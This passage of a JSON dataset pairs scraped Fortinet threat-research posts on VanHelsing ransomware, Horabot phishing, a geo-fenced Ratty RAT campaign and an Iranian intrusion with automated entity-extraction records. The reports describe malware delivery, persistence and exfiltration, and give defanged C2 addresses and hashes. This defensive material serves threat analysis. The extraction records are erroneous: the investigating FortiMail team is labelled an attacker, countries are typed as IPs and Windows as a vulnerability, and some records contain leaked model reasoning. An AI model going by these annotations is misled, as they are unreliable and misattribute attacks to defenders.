is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. VanHelsing Ransomware File IOCs SHA2 Note 86d812544f8e250f1b52a4372aaab87565928d364471d115d669a8cc7ec50e17 VanHelsing ransomware Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Ransomware Roundup report, Threat Type), (VanHelsing, Malware), (Microsoft Windows, Platform), (Ransomware, Threat Type), (Fortinet solutions, Tool), (2025 Global Threat Landscape Report, Threat Type), (VanHelsing ransomware, Malware), (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98, Hash), (Microsoft Windows, Platform), (Ransomware, Threat Type), (Fortinet solutions, Tool), (2025 Global Threat Landscape Report, Threat Type), (VanHelsing ransomware, Malware), (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98, Hash)\nRelationships: (FortiGuard Labs, produces, Ransomware Roundup report), (FortiGuard Labs, produces, 2025 Global Threat Landscape Report), (Ransomware Roundup report, discusses",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Ransomware Roundup report",
          "Threat Type"
        ],
        [
          "VanHelsing",
          "Malware"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "Ransomware",
          "Threat Type"
        ],
        [
          "Fortinet solutions",
          "Tool"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Threat Type"
        ],
        [
          "VanHelsing ransomware",
          "Malware"
        ],
        [
          "SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98",
          "Hash"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "Ransomware",
          "Threat Type"
        ],
        [
          "Fortinet solutions",
          "Tool"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Threat Type"
        ],
        [
          "VanHelsing ransomware",
          "Malware"
        ],
        [
          "SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98",
          "Hash"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "produces",
          "Ransomware Roundup report"
        ],
        [
          "FortiGuard Labs",
          "produces",
          "2025 Global Threat Landscape Report"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 15,
    "relationship_count": 2,
    "model": "Qwen3 4B",
    "index": 15
  },
  {
    "title": "Horabot Unleashed: A Stealthy Phishing Threat",
    "link": "https://www.fortinet.com/blog/threat-research/horabot-unleashed-a-stealthy-phishing-threat",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Collects victim’s sensitive informationSeverity Level:High In April, FortiGuard Labs observed a threat actor using phishing emails with malicious HTML files to spread Horabot, malware that primarily targets Spanish-speaking users. It is known for using crafted emails that impersonate invoices or financial documents to trick victims into opening malicious attachments and can steal email credentials, harvest contact lists, and install banking trojans. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Horabot leverages Outlook COM automation to send phishing messages from the victim’s mailbox, enabling it to propagate laterally within corporate or personal networks. The threat actor also executed a combination of VBScript, AutoIt, and PowerShell to conduct system reconnaissance, credential theft, and the installation of additional payloads. Based on the telemetry gathered by FortiGuard Labs, these attacks target users in Latin America, including Mexico, Guatemala, Colombia, Peru, Chile, and Argentina. To trick the recipient into opening the email and attachment, it is written in Spanish from a “legitimate” sender in Mexico, and its subject line references an attached invoice (Factura Adjunta). The message claims to include a PDF invoice for acquired services or products and urges the user to open the attachment. However, the attached ZIP file contains a malicious HTML file with Base64 encoded data in the “iframe” tag. This decoded data is also HTML data with a remote URL “hxxps://t4[.]contactswebaccion[.]store/0704/” used to download the next payload. The URL leads to a web page with JavaScript that immediately attempts to download the hard-coded ZIP file “ADJUNTOS_23042025.zip.” The file “ADJUNTOS_23042025.zip” contains an HTA file with a large number of unused strings in the <body>. The <script> tag uses “moveTo(7426, 6245),” a browser redirection trick that repositions the window. It then loads a script from “hxxps://d1[.]webcorreio[.]pics/LNIJGPNIPPK/WWGDI.” The script on the remote server injects an external VBScript hosted at “hxxps://dl[.]webcorreio[.]pics/g1/.” This VBScript is appended into the HTML <head> element, enabling stealthy execution within the user's browser context. The script serves to check the victim’s environment and deliver additional payloads. The VBScript at “hxxps://dl[.]webcorreio[.]pics/g1/” implements a custom string-decoded routine by processing every two characters, performing mathematical transformations, and reconstructing hidden strings, such as URLs, PowerShell commands, or other instructions. This method helps the malware evade static detection by keeping its real behavior hidden until execution. The following are the main tasks in this script, along with a screenshot of the decoded string: 1. Environment Detection and Evasion 2. Folder Preparation:It checks the working directory and if “C:\\Users\\Public\\LAPTOP-0QF0NEUP” does not exist, it creates it. Otherwise, it quits the script to avoid potential re-infection. 3. Collection and Exfiltration:This process collects the victim's basic information by grabbing the local IP address, computer name, username, and Windows version. It then sends the collected data via HTTP POST to “hxxps://d1[.]webcorreio[.]pics/g1/ctld/salvar.php.” 4. Preparation for AutoIt 5. Preparation for PowerShell:Creates a Batch script (.bat) to decode a text file (.tws) for executing a PowerShell script from “hxxps://labodeguitaup[.]space/a/08/150822/au/au.” This script is responsible for spreading phishing mail. 6. Persistence:First, it deletes all .lnk, .cmd, .bat, .exe, .vbs, and .tws files in the %Startup% and %AppData% folders. It then creates a new shortcut .lnk file pointing to the hidden dropped files related to the AutoIt payload (winupdate_version_686.exe with .ai arguments). It also sets the .lnk file to execute the Batch script during system startup for the PowerShell script. 7. Execution and Cleanup:It executes the created shortcuts via PowerShell commands using ExecutionPolicy Bypass to avoid script execution restrictions and kills mshta.exe. In the following sections, we’ll elaborate on the activities delivered by the encrypted data and the remote PowerShell. The AutoIt script “winupdate_version_067.ai” is for decryption. It finds the “.ia” file in the same directory, decrypts it with the hard-coded key “99521487,” injects the decrypted malicious DLL, and executes the entry point at “B080723_N.” The DLL begins by collecting system information from the victim’s machine, including the current date and time, operating system version, username, hostname, and installed antivirus software. It then sends this data via a POST request to the C2 server “hxxp://209[.]74[.]71[.]168/on7all/index15.php.” The exfiltrated data is organized into two parameters: AT, which carries information such as timestamp, OS type, and user identity, and MD, which specifically identifies the presence and name of antivirus software. This structured telemetry allows the attacker to profile infected systems. The malware then proceeds to steal browser-related data from a range of targeted web browsers, including Brave, Yandex, Epic Privacy Browser, Comodo Dragon, Cent Browser, Opera, Microsoft Edge, and Google Chrome. Once the data is collected, it is exfiltrated to the remote server at “hxxp://93[.]127[.]200[.]211/a/08/150822/au/logs/index.php?CHLG.” In addition to data theft, Horabot monitors the victim’s behavior and injects fake pop-up windows designed to capture sensitive user login credentials. These overlay windows are embedded within the RCData section of the decrypted malicious DLL, enabling stealthy deployment and execution without relying on external visual components. The target script on “hxxps://labodeguitaup[.]space/a/08/150822/au/au” in the previous VBScript intends to execute another six scripts at the remote server “hxxp://93[.]127[.]200[.]211/a/08/150822/au”: “app,” “a2,” “a3,” “a4,” “a5,” and “a6.” For unknown reasons, the “a5” file is empty, but the rest of the files can achieve a full cycle of building a victim list, email automation, and efficient Horabot payload delivery. The “app” acts as an infection check, checking whether a marker file (C:\\Users\\Public\\d240425) exists and exiting if it does. It then forcefully terminates any running instance of Outlook (Outlook.exe) to ensure it can launch Outlook cleanly using a COM object. Then, after creating an Outlook.Application object and accessing its MAPI namespace, it initializes an empty list to collect email addresses and defines a blocked domain list—“gmail,” “hotmail,” “outlook,” “edu,” “con.mx,” and “facebook”—which avoids collecting personal, academic, and Facebook-related emails. The “a2” script contains two functions to build a list of email addresses. The first function is designed to scan the contact data within Outlook’s AddressLists. For each contact, it checks the AddressEntryUserType to determine whether the email address can be directly retrieved or must be resolved via GetExchangeUser() to extract the primary SMTP address. The second function recursively traverses all folders in the Outlook mailbox structure, extracting and filtering email addresses from both recipients and senders of each message using the same logic. The “a3” script saves collected addresses in the “APPDATA\\Microsoft\\.Outlook” to reduce visibility and transmits the email list to an external server, “labodeguitaup[.]space.” It then fetches a payload from another server, “93[.]127[.]200[.]211,” and converts the response content to Base64 for later use. This routine indicates the malware is not only gathering target data but also preparing for future interactions or customized delivery stages. The “a4” script constructs and delivers malicious emails disguised as legitimate invoices. It saves the payload from server “93[.]127[.]200[.]211” with a “.PDF.html” filename and compresses it into a .zip archive that mimics a standard invoice attachment. It then prepares to send this archive as an attachment via Outlook. It references the extracted email address, excluding known domains like Gmail, Yahoo, Hotmail, .edu, Facebook, and .con.mx through the “Verificar-PalavrasBloqueadas” function (Check-BlockedWords). For each valid target, it creates an email item with a subject line referencing a “FWD Factura Adjunta” (FWD Invoice Attached), a Spanish-language body message about the attached invoice, and the malicious zip archive as an attachment. After the emails are sent, the script “a6” removes all traces and deletes related files, reducing the chances of being detected. Horabot is a growing threat demonstrating how phishing attacks are becoming more advanced, especially in Latin America. It spreads through fake Spanish-language emails pretending to be invoices, tricking people into opening harmful attachments. The malware uses VBScript, AutoIt, and PowerShell to hide itself, steal login credentials, and collect email contacts. It then uses Outlook to send itself to more victims, spreading through companies and personal networks. Because it is designed to blend in with normal Windows and Outlook behavior, it can be hard to notice. Organizations should block suspicious emails, watch for unknown file activity, and educate employees to be cautious with phishing scams. The malware described in this report are detected and blocked byFortiGuard Antivirusas: HTML/Phishing.683A!trHTML/Agent.9DFA!trAutoIt/Agent.HA!trBAT/Agent.PR!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. Domain t4[.]contactswebaccion[.]storef5[.]contactswebaccion[.]spacelabodeguitaup[.]space209[.]74[.]71[.]16893[.]127[.]200[.]211d1[.]webcorreio[.]picsupdatec[.]lat SHA256SCRIPT 523d7e9005b2e431068130989caf4a96062a029b50a5455d37a2b88e6d04f83d84d77737196ea5a8cb0efd8fc3ea61a878d1e1851cc63bcb1e0868019c71996f13a5c60a799c104a7bb1ff1489b82031c2ea1ed10712ca019e996fc0e37e9dfa2ba471519bed0a5503408fee0593bc13547c88cfb10872a9739c2b1eaa5a287ca885b89bb145dde56f6b63fcbf3560fb7179df43df5d212217ca583405beceb8 AUTOIT 25be06643204fc7386db3af84b200d362c3287b30c7491b666c4fe821a8c6eb45368f9f0994b28295aaf7d7af586d78827a95c6eb359a3921ebaa8d2fe1c98a9f7140c28921dcf9ac542965a37b5473432f39b34f00161b6f0c0f8af7c9551a5 BATCH 265a11951f6ac1fd1f150d2711e0158a59416dd709759b39904470f44c83272a370ccca7392282056f20b45829d0cac92acacfc07ab9699c54b3695649713854 Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (Microsoft Windows, Vulnerability), (Microsoft Windows, Impact), (Horabot, Malware), (Phishing, Technique), (VBScript, Tool), (AutoIt, Tool), (PowerShell, Tool), (Latin America, Region), (Mexico, Region), (Guatemala, Region), (Colombia, Region), (Peru, Region), (Chile, Region), (Argentina, Region), (Factura Adjunta, File)\nRelationships: (Horabot, uses, Phishing), (Horabot, uses, VBScript), (Horabot, uses, AutoIt), (Horabot, uses, PowerShell), (Horabot, targets, Latin America), (Horabot, targets, Mexico), (Horabot, targets, Guatemala), (Horabot, targets, Colombia), (Horabot, targets, Peru), (Horabot, targets, Chile), (Horabot, targets, Argentina), (Horabot, uses, Factura Adjunta)\nOkay, let's break down the input text step by step. The main goal is to identify the entities and their relationships based on the specified types.\n\nFirst, I'll scan the text for any mentions of the entity types. The first part mentions \"Microsoft Windows\" in the context of \"Affected Platforms\" and \"Impacted Users\". However, the entity types don't include \"Platform\" or \"Region\", so I",
      "entities": [
        [
          "Microsoft Windows",
          "Vulnerability"
        ],
        [
          "Microsoft Windows",
          "Impact"
        ],
        [
          "Horabot",
          "Malware"
        ],
        [
          "Phishing",
          "Technique"
        ],
        [
          "VBScript",
          "Tool"
        ],
        [
          "AutoIt",
          "Tool"
        ],
        [
          "PowerShell",
          "Tool"
        ],
        [
          "Latin America",
          "Region"
        ],
        [
          "Mexico",
          "Region"
        ],
        [
          "Guatemala",
          "Region"
        ],
        [
          "Colombia",
          "Region"
        ],
        [
          "Peru",
          "Region"
        ],
        [
          "Chile",
          "Region"
        ],
        [
          "Argentina",
          "Region"
        ],
        [
          "Factura Adjunta",
          "File"
        ]
      ],
      "relationships": [
        [
          "Horabot",
          "uses",
          "Phishing"
        ],
        [
          "Horabot",
          "uses",
          "VBScript"
        ],
        [
          "Horabot",
          "uses",
          "AutoIt"
        ],
        [
          "Horabot",
          "uses",
          "PowerShell"
        ],
        [
          "Horabot",
          "targets",
          "Latin America"
        ],
        [
          "Horabot",
          "targets",
          "Mexico"
        ],
        [
          "Horabot",
          "targets",
          "Guatemala"
        ],
        [
          "Horabot",
          "targets",
          "Colombia"
        ],
        [
          "Horabot",
          "targets",
          "Peru"
        ],
        [
          "Horabot",
          "targets",
          "Chile"
        ],
        [
          "Horabot",
          "targets",
          "Argentina"
        ],
        [
          "Horabot",
          "uses",
          "Factura Adjunta"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 15,
    "relationship_count": 12,
    "model": "Qwen3 4B",
    "index": 16
  },
  {
    "title": "Multilayered Email Attack: How a PDF Invoice and Geo-Fencing Led to RAT Malware",
    "link": "https://www.fortinet.com/blog/threat-research/multilayered-email-attack-how-a-pdf-invoice-and-geofencing-led-to-rat-malware",
    "content": "FortiGuard Labs Threat Research Affected platforms:Windows (primarily), Linux & macOS (if Java is installed)Impacted parties:Users on systems with Java Runtime Environment (JRE) installedImpact:Grants remote access to attackers, enabling them to execute commands, log keystrokes, access files, activate webcam/microphone, and fully control the infected systemSeverity level:High The FortiMail IR team recently uncovered a new email campaign distributing a Remote Access Trojan (RAT) using multiple evasion techniques to target organizations in Spain, Italy, and Portugal. The campaign leverages theserviciodecorreoemail service provider, which is configured as an authorized sender for various domains and successfully passes SPF validation. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Additionally, it employs advanced evasion strategies, including the abuse of two file-sharing platforms, geolocation filtering, and Ngrok to create secure, obfuscated tunnels. These tactics further complicate detection and effectively mask the attack's true origin, ultimately facilitating the distribution of RATty malware. This campaign highlights the increasing sophistication of malware attack methodologies, leveraging the legitimate functionalities of remote administration tools for malicious purposes. The attacker exploits serviciodecorreo.es, a legitimate Spanish email service authorized to send emails on behalf of various domains. Since the SPF record for these domains designates serviciodecorreo.es as a valid sender, the malicious emails successfully pass SPF checks, creating the illusion of legitimacy. Consequently, these emails are more likely to bypass security filters, making it easier for them to be accepted by the recipient's mail server. This increases the likelihood of a successful attack, as the deceptive nature of the emails goes unnoticed. The sender attaches a PDF file asking the recipient to review two new invoices. This makes the recipient believe this email is important, which may influence them to check the attached files and details. This is basic social engineering to tempt the recipient into acting with less caution and under pressure. The attached PDF file displays a message indicating that the file is not being shown correctly and instructs the recipient to click a button to download the file locally. The button contains a Dropbox (file-sharing platform) link to download an HTML file named \"Fattura\" (Translation: “Invoice”). The choice of this file name plays into the social engineering tactic, aiming to persuade the recipient to click and view the information, ultimately leading to the delivery of a malicious payload. The HTML file contains a basic validation step with an \"I am not a robot\" prompt. After completing the verification, a simple HTML page is displayed with instructions to click a button to view the document. The button redirects the user to a link generated by Ngrok, a tunneling tool that allows users to expose local servers to the internet through secure, temporary URLs. The following URL abuses the MediaFire file-sharing platform by automatically downloading the JAR file (FA-43-03-2025.jar) when accessed. hxxps://download1528[.]mediafire[.]com/35ougpab4uhgHgb3Pmqh8niQ0hzS9b-TtTro5oPV5iUIULfNckqgXvjXQ6aTp-NF-k8EflSnFWC--Ffh4aX1NlYrzaPzgFlyxHVe0fKkLE1p3u5cntfU25orm92QdoQmXE9-gyI4hRgSYpaNcd3o12kJnPRbJhD3aqbl1Qx3vqbUtk8/ayp0ikmndrdseht/FA-43-03-2025.jar Using a legitimate file-sharing service helps attackers further evade detection, as security filters are less likely to flag downloads from trusted platforms. This tactic makes detection and blocking more difficult for security companies since automated analysis systems, sandbox environments, and security researchers often inspect URLs from locations outside the targeted region. By selectively delivering the malware only to specific geolocations, attackers reduce the risk of early detection and increase the likelihood of a successful attack. Below, we can see how this evasion leads to a Google Drive link containing a legitimate file: Ngrok is primarily used to test webhooks, develop locally hosted applications, and bypass NAT/firewall restrictions. However, as in this case, threat actors can misuse Ngrok to create dynamic, hard-to-detect phishing links that evade traditional security filters. Attackers use Ngrok to dynamically generate URLs that help them evade email security filtering mechanisms. One key technique they employ is geo-based cloaking, which serves different content depending on the user's location. In this case, when users access the Ngrok-generated URL from any country except Italy, they are redirected to a seemingly legitimate Google Drive document, making it harder for email security solutions to classify the URL as malicious. The attached fake invoice is identical for all targeted organizations. It is a purported invoice from the global health organization Medinova Health Group, and it has been designed to bypass most email security mechanisms. The seemingly legitimate invoice, shared via Google Drive, is unlikely to raise suspicion during email scanning and is intended to slip past email security engines without triggering any suspicion of malicious intent. However, when the request originates from Italy, the URL changes entirely, leading to downloading a malicious JAR file. Most email security systems perform email analysis from generic or cloud-based environments, not tied to a specific geographic location. As a result, when these systems access the embedded URL, they are redirected to a harmless decoy page rather than the malicious file. This geofencing technique ensures that only users in the targeted regions -in this case, Italy - can reach the actual malicious content. The .jar file contains a type ofRattymalware.  The file name, \"FA-43-03-2025.jar,\" resembles a neutral reference number. While such naming conventions are not unusual, this name was probably specifically chosen to prompt the end user to click and execute the file, assuming it is related to a payment document, thus encouraging hasty and careless action. Ratty RAT is a Java-based Remote Access Trojan (RAT) typically distributed as a .jar file. Since Java is a cross-platform language, Ratty RAT can run on various operating systems as long as the Java Runtime Environment (JRE) is installed. Threat actors use Ratty RAT to execute remote commands, log keystrokes, capture screenshots, and steal sensitive data, often as part of email-based social engineering campaigns with malicious attachments. While it is commonly delivered as a .jar file, attackers may also package it as an MSI (Microsoft Installer) file to increase its legitimacy and evade detection. By bundling the RAT inside an MSI, they can disguise it as legitimate software or an update, making it easier to trick users into executing the malware. What makes this email campaign particularly sophisticated is its combination of multiple tactics designed to evade detection and exploit trusted platforms. Its multi-layered strategy uses social engineering techniques to manipulate recipients into clicking on malicious links. The initial email, disguised as an invoice and sent from a sender who appears legitimate, serves as the entry point. The attacker clearly conducted prior research, identifying which domains allow the use of the specific email service for sending emails, thereby bypassing some critical security measures. The attackers also abuse file-sharing platforms like Dropbox and MediaFire to deliver their malicious payload while leveraging geolocation techniques to tailor the attack based on the recipient's location. Additionally, the use of Ngrok complicates detection by creating secure, obfuscated tunnels that mask the true origin of the attack. Together, these elements create a highly advanced and effective method of distributing malware, including RATty (Remote Access Trojan), which is challenging for traditional security systems to detect and block. Fortinet provides multiple layers of protection against this threat. FortiGate and FortiClient detect and block the malicious JAR file using the latest antivirus (AV) signatures. Customers are advised to ensure their systems are regularly updated with the most recent AV database.Fortinet customers are also already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services. FortiMail recognizes the phishing email as “virus detected,” and the FortiMail Content Disarm and Reconstruction (CDR) function automatically detects and mitigates this threat. In addition, FortiSandbox, embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions, provides real-time anti-phishing protection against known and unknown phishing attempts. Perception Point Email Security, now part of Fortinet FortiMail, also proactively detects and blocks emails containing malicious geo-fenced URLs used to deliver malware and phishing content and the RATty JAR file itself. This is achieved through advanced dynamic scanning and static analysis techniques. Combined, these detection capabilities ensure threats are mitigated during delivery, through malicious emails and links, and upon download, delivering end-to-end protection across the entire attack chain.In addition to technical defenses, organizations should adopt Security Awareness Training (SATs) programs and conduct regular phishing simulations. Fortinet’s freeNSE training:NSE 1 – Information Security Awarenessmodule on Internet threats is designed to help end users learn how to identify and protect themselves from phishing attacks.TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. By empowering users to recognize and respond to suspicious content, these initiatives significantly lower the risk of successful phishing or malware attacks.If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.You can alsosign upto receive future alerts to stay informed of new and emerging threats. IPs 143.47.53.106130.51.20.126199.232.214.172199.232.210.172 Domains: jw8ndw9ev[.]localto[.]netl5ugb6qxh[.]localto[.]net Hash (sha256): a1c2861a68b2a4d62b6fbfc7534f498cefe5f92f720466d24ae1b66ebc9f5731d20d14792c91107f53318ff7df83b9cd98acd3c394959a74e72278682822b6009184ff2cdd05fcaf111db23123479c845b2ece2fedccc2524b2de592f99808765f897fec78e2fd812eb3bc451222e64480a9d5bc97b746cc0468698a634708806153c80b17cb990caad1d80cac72c867d4ecfa1a84b7ab286b7373cd4168794e469b8911fd1ae2ded8532a50e9e66b8d54820c18ccdba49d7a38850d6af54475af8b6ac45918bc87d2a164fae888dab6e623327cba7c2409e4d0ef1dde8d1793 malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiMail IR team, Attacker), (serviciodecorreoemail, Tool), (serviciodecorreo.es, Domain), (RATty malware, Malware), (2025 Global Threat Landscape Report, File), (Ngrok, Tool), (file-sharing platforms, Tool), (geolocation filtering, Technique), (SPF validation, Technique), (Remote Access Trojan, Threat Type), (Spain, IP), (Italy, IP), (Portugal, IP)\nRelationships: (FortiMail IR team, associated with, serviciodecorreoemail), (FortiMail IR team, associated with, serviciodecorreo.es), (FortiMail IR team, associated with, RATty malware), (serviciodecorreoemail, configured as, serviciodecorreo.es), (RATty malware, exploit, serviciodecorreo.es), (RATty malware, use, Ngrok), (RATty malware, use, file-sharing platforms), (RATty malware, use, geolocation filtering), (RATty malware, use, SPF validation), (RATty malware, use, Remote Access Trojan), (RATty malware, target, Spain), (RATty malware, target, Italy), (RATty malware, target, Portugal)\nOkay, let's tackle this step by step. First, I need to identify all the entities in the given text according to the specified types.",
      "entities": [
        [
          "FortiMail IR team",
          "Attacker"
        ],
        [
          "serviciodecorreoemail",
          "Tool"
        ],
        [
          "serviciodecorreo.es",
          "Domain"
        ],
        [
          "RATty malware",
          "Malware"
        ],
        [
          "2025 Global Threat Landscape Report",
          "File"
        ],
        [
          "Ngrok",
          "Tool"
        ],
        [
          "file-sharing platforms",
          "Tool"
        ],
        [
          "geolocation filtering",
          "Technique"
        ],
        [
          "SPF validation",
          "Technique"
        ],
        [
          "Remote Access Trojan",
          "Threat Type"
        ],
        [
          "Spain",
          "IP"
        ],
        [
          "Italy",
          "IP"
        ],
        [
          "Portugal",
          "IP"
        ]
      ],
      "relationships": [
        [
          "FortiMail IR team",
          "associated with",
          "serviciodecorreoemail"
        ],
        [
          "FortiMail IR team",
          "associated with",
          "serviciodecorreo.es"
        ],
        [
          "FortiMail IR team",
          "associated with",
          "RATty malware"
        ],
        [
          "serviciodecorreoemail",
          "configured as",
          "serviciodecorreo.es"
        ],
        [
          "RATty malware",
          "exploit",
          "serviciodecorreo.es"
        ],
        [
          "RATty malware",
          "use",
          "Ngrok"
        ],
        [
          "RATty malware",
          "use",
          "file-sharing platforms"
        ],
        [
          "RATty malware",
          "use",
          "geolocation filtering"
        ],
        [
          "RATty malware",
          "use",
          "SPF validation"
        ],
        [
          "RATty malware",
          "use",
          "Remote Access Trojan"
        ],
        [
          "RATty malware",
          "target",
          "Spain"
        ],
        [
          "RATty malware",
          "target",
          "Italy"
        ],
        [
          "RATty malware",
          "target",
          "Portugal"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 13,
    "model": "Qwen3 4B",
    "index": 17
  },
  {
    "title": "FortiGuard Incident Response Team Detects Intrusion into Middle East Critical National Infrastructure",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-incident-response-team-detects-intrusion-into-middle-east-critical-national-infrastructure",
    "content": "FortiGuard Labs Threat Research The FortiGuard Incident Response (FGIR) team recently investigated a long-term cyber intrusion targeting critical national infrastructure (CNI) in the Middle East, attributed to an Iranian state-sponsored threat group. The attack involved extensive espionage operations and suspected network prepositioning—a tactic often used to maintain persistent access for future strategic advantage. Full Report Available:The following article provides key findings, but a full report of this activity is availablehere. The report includes an analysis of novel malware deployed throughout the intrusion, a detailed breakdown of adversary TTPs across different attack stages, Indicators of Compromise (IOCs) to assist defenders, and attribution considerations for deeper insight. The intrusion persisted from at least May 2023 to February 2025, with signs of compromise dating back as far as May 2021. Attackers initially gained access via stolen VPN credentials and established persistence through multiple web shells and backdoors, including Havoc, HanifNet, HXLibrary, and NeoExpressRAT. They bypassed network segmentation using open-source proxying tools like plink, Ngrok, glider proxy, and ReverseSocks5. Key insights from the investigation include: The attack unfolded in four distinct phases: 1. Establishing a Foothold and Initial Operations (May 2023 – April 2024)The adversary used stolen credentials to access the victim’s SSL VPN, deploying web shells on public-facing servers and installing Havoc, HanifNet, and HXLibrary backdoors. They then stole credentials and moved laterally using RDP and PsExec. 2. Consolidating the Foothold (April 2024 – November 2024)Additional persistence mechanisms were introduced, including NeoExpressRAT. The adversary chained proxies (plink, Ngrok) to bypass segmentation, exfiltrated targeted email data, and began interacting with virtualization infrastructure. 3. Initial Remediation and Adversary Response (November 2024 – December 2024)The victim implemented initial containment steps, prompting a surge in adversary activity. To maintain access, additional web shells, SystemBC, and MeshCentral were deployed, with a focus on targeting deeper CNI network segments. 4. Intrusion Containment and Final Adversary Response (December 2024 – Present)The victim successfully removed adversary access. In response, attackers attempted to re-enter via vulnerabilities in web applications and launched targeted phishing campaigns to steal credentials. Multiple failed access attempts were detected. The victim organization had a highly segmented network, including a restricted Operational Technology (OT) environment. While no confirmed disruption to OT systems was found, FGIR observed targeted reconnaissance and credential harvesting, indicating strong adversary interest in these systems. The attackers moved from IT to restricted segments by chaining proxy tools and implants to bypass segmentation. The attacker relied on VPS-hosted infrastructure, avoiding U.S.-based providers. Notable malware variants used include: State-sponsored cyber adversaries continue to target and compromise critical infrastructure networks, seeking to maintain persistent access. Organizations should prioritize the following defensive measures: This investigation highlights the persistent and evolving nature of state-backed cyber threats targeting Middle Eastern CNIs. The adversary demonstrated advanced tactics to deeply embed themselves, evade detection, and sustain long-term access. Despite containment efforts, the adversary has continued efforts to regain access, indicating a long-term strategic interest in this environment. Organizations must remain vigilant, continuously refining their detection and response strategies to defend against sophisticated, state-sponsored cyber campaigns. For adetailed breakdown of adversary TTPs, novel malware, and IOCs, access the full reporthere. incident response FortiGuard Labs Threat Research FortiGuard Labs Threat Research CISO Collective Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
